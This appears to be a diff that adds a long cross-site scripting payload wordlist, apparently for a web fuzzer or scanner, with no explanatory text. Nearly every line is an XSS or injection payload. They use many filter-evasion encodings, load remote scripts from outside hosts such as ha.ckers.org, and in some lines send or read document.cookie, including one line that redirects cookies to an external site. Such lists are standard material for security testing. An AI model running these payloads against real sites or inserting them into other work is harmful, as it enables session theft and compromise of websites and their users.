+exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
+%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+href="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDQyKTs8L3NjcmlwdD4="	base64
+"><s"%2b"cript>alert(document.cookie)</script>
+a=alert,a(1)
+<HTML><BODY>
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
+&#x2329;script&#x232A;
+link=
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
+&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
+${alert(1)}
+&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
+'-prompt(8)-'
+LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+\";document.vulnerable=true;;//
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+<svg xmlns="http://www.w3.org/2000/svg" id="x"><listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/><handler id="y">alert(127)</handler></svg>
+&{document.vulnerable=true;};
+<img SRC="jav ascript:document.vulnerable=true;">
+<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
+<div style="binding: url([link to code]);">
+&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+setInterval`alert\x28document.domain\x29`
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<layer
+%u22%u27%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e
+&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
+<h1><font color=blue>hellox worldss</h1>
+<~/XSS STYLE=xss:expression(alert('XSS'))>
+&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+<link/rel=prefetch import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
+><object+data=//14.rs>
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+jAvas/* */Cript:confirm(42)
+<br><x id=x>#x
+eval(URL.slice(-8))>#alert(1)
+<?xml
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
+\'}alert(1);{//
+<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+<embed src=%(jscript)s></embed>
+*/</script>'>alert(1)/*<script/1='
+<;SCRIPT>;a=/XSS/
+&#00060
+"'%2507%253e%2507%253cscript%2507%253ealert(42)%2507%253c/script%2507%253e
+<iframe src=http://ha.ckers.org/scriptlet.html <
+&#x2039;script&#x203A;
+left:\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450
+<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
+\"-alert(1)}//
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+"><script src=//brutelogic.com.br&sol;1.js&num;
+&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+">
+alert;pg("XSS")
+<A href="javascript%26colon;confirm()">click
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==
+%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+eval
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+window.alert("Bonjour !");
+left:EXPR/**/ESSION(alert('XSS'))
+<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
+%u0022%u0027%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e
+&#X3c;
+<base href=//0>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+?userDefined=');function someFunction(a){}alert(1)//",
+<x style="background:url('x[a];color:red;/*')">XXX</x>
+"><iframe%20src="http://google.com"%%203E
+&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;
+';alert('abc');'
+{{$on.constructor('alert(1)')()}}
+style=
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+%25u22%25u27%25u3e%25u3cscript%25u3econfirm(42)%25u3c/script%25u3e
+<script src="data:&comma;alert(1)//
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+<div style="[a]color[b]:[c]red">XXX</div>
+<img src=&{document.vulnerable=true;};>
+<br><br><br><br><br><br><br><br><br><br>
+<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
+&lt;!--[if gte IE 4]&gt;
+document
+prompt(123)
+'}alert(1)%0A{'
+<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
+<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<;/br style=a:expression(alert())>;
+&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
+<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+" value=``
+prompt(document.domain)
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
+&#060
+/'>
+&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+<!-- open comment
+eval(location.hash.slice(1)>#alert(1)
+<div style="font-family:'foo&#10;;color:red;';">LOL
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
+&lt;/br style=a:expression(alert())&gt;
+<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
+top.open`javas\cript:al\ert(1)`
+'">><marquee><h1>XSS</h1></marquee>
+&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
+<svg
+onmouseover
+Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+"src=
+1111111
+"-eval("window['pro'%2B'mpt'](8)")-"
+<div id="x">x</div><xml:namespace prefix="t"><import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<iframe src=%(scriptlet)s <
+<a href=javas&#99;ript:alert(1)>
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+alert(1)>//INJECTX
+'-eval("window['pro'%2B'mpt'](8)")-'
+egal=
+<div style=content:url(%(svg)s)></div>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+alt=
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<p
+‘; alert(document.cookie); var foo=’
+"/>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
+a=\"get\";
+&LT
+<STYLE>@import'%(css)s';</STYLE>
+<<scr\0ipt/src=http://xss.com/xss.js></script
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+<img src="https://i.imgur.com/bYmdHcX.gif"></img>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
+left:&#xff25;&#xff38;&#xff30;&#xff32;&#xff42;&#xff53;&#xff33;&#xff29;&#xff2f;&#xff2e;(alert('XSS'))
+'
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+<div style="font-family:foo}color=red;">XXX</div>
+&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+"><script src=data:&comma;alert(1)//
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+"'%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e
+<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
+')
+&#x0003C
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
+<img src="http://sn1persecurity.com/.testing/xss.png?img_src=2"></img>//INJECTX
+&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
+<a href="[a]java[b]script[c]:alert(101)">XXX</a>
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
+<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+left:&#xff45;&#xff58;&#xff50;&#xff52;&#xff45;&#xff53;&#xff53;&#xff49;&#xff4f;&#xff4e;(alert('XSS'))
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+"'><;(24)trela=daolno ;''=e>'=d
+&#x003C;
+perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
+<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+"-prompt(8)-"
+'}alert(1);{'
+<img src="http://38.media.tumblr.com/809d39daf44dd25ef7ce77706e44e953/tumblr_nuvz98USdD1resp2ko1_500.gif"></img>
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
+';alert('1');'
+<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
+"alt=
+&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
+&#0000060
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+?alert(1)",
+<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
+perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
+<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+\";;alert(';XSS';);//
+href="data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0="	UTF-7 in base64
+left:exp\0280essio\0274(alert('XSS'))
+document.cookie(
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+&#X003c;
+<a href=
+&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
+eval(a+b+c+d);
+top.
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
+<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
+&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+"'%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e
+<!DOCTYPE x [<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(67)" onload CDATA "alert(2)">]><img />
+&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+&#0060
+&#X03C
+confirm(document.domain)
+href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg-confirm(42)+ADsAPA-/script+AD4-"	UTF-7/UTF-8 mix
+alert&#40;1&#41
+&#x03c
+&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+<meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+&#X003C
+\u003C
+href="data:text/html;charset=utf-7,+ADw-script+AD4-confirm(42)+ADsAPA-/script+AD4-"	UTF-7
+<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
+'';!--\"&lt;XSS&gt;=&{()}
+?playerready=alert(document.cookie)
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+';alert(test); //
+"'><sc	ript>confirm(42)</script>
+<?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval><if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if></template></stylesheet>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
+'>
+cookie
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<![CDATA[ open cdata
+<div STYLE="width: expression(document.vulnerable=true);">
+<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+left:expr&#101;ssion(alert('XSS'))
+<;DIV STYLE=";width: expression(alert(';XSS';));";>;
+"'><sc\tript>confirm(42)</script>
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler></svg>
+"title=
+&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
+<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<DIV STYLE="width: expression(alert('XSS'));">
+alert&lpar;1&rpar;
+<div style=content:url(test2.svg)></div><div style="background:url(test5.svg)">PRESS ENTER</div>
+<IMG SRC="livescript:[code]">
+<br SIZE="&{document.vulnerable=true}">
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+<IMG SRC=”jav ascript:alert(‘XSS’);”>
+&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"><x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/></svg>
+<form><isindex formaction="javascript&colon;confirm(1)"
+\\";alert('XSS');//
+<embed type="image" src=%(scriptlet)s></embed>
+&#X00003C
+foo\’; alert(document.cookie);//’;
+%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
+</TITLE><object/data=https://finickycold.htmlpasta.com>
+&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+<</div>script</div>>alert()<</div>/script</div>>
+<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+%2507%2522%2507%2527%2507%253e%2507%253cscript%2507%253ealert(42)%2507%253c/script%2507%253e
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+\&quot;;alert(&apos;XSS&apos;);//
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+"style=
+left:ｅｘｐｒｅｓｓｉｏｎ(alert('XSS'))
+<IMG SRC="mocha:[code]">
+jAvas\Cript:confirm(42)
+left:ＥＸＰＲＥＳＳＩＯＮ(alert('XSS'))
+${``[class extends[alert``]{}]}
+<!-- INJECTX
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
+<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+onerror
+<object allowscriptaccess="always" data="test.swf"></object>
+&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
+// INJECTX
+<br size=\"&{alert('XSS')}\">
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+&lt;/BODY&gt;&lt;/HTML&gt;
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
+<style>@import'http://www.securitycompass.com/xss.css';</style>
+title=
+<index
+XXXXXXX
+"egal=
